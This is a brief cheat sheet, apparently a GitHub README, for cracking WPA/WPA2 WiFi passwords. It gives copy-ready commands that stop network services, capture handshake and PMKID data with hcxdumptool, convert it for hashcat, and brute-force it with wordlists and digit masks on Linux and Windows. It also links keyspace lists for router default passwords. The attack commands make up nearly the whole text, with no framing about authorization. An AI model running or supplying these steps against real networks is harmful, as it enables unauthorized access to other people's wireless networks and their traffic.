# WiFi-Cracking-with-HashCat
Cat: Security

### "WiFi WPA/WPA2 vs hashcat and hcxdumptool" by David Bombal
https://www.youtube.com/watch?v=Usw0IlGbkC4

### "16 secs to break it! 😱 70% of real world WiFi networks owned!" by David Bombal
https://www.youtube.com/watch?v=ZTIB9Ki9VtY

## COMMANDS

### Stop Network Manager and WPA Supplicant Services
```
sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant
```

### Run hcxdumptool to capture WLAN information
```
sudo hcxdumptool -i [wifi interface] -o dumpfile.pcapng --active_beacon --enable_status=1
```

### Restart Network Manager and WPA Supplicant Services
```
sudo systemctl start wpa_supplicant && sudo systemctl start NetworkManager
```

### Convert PCAPNG file to hash file
```
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```

### Capture MAC addresses
```
sudo hcxdumptool --do_rcascan -i [wifi interface]
```

### Run Hashcat with a wordlist
```
hashcat -m 22000 hash.hc22000 wordlist.txt
```
### Run Hashcat with Brute Force
?d digits, ?l lower, ?u upper, ?s special, ?a all
```
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

hashcat -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
```
### Linux potfile
```
~/.local/share/hashcat
```

## Windows:
```
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
```
hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
```


Usefull repositories for routers with default passwords.

https://github.com/sheimo/Wifi-WPA-Keyspace-List

https://github.com/n0kovo/ssid-keyspace-table

https://github.com/soxrok2212/PSKracker/blob/master/keyspace.md

https://github.com/berzerk0/Probable-Wordlists
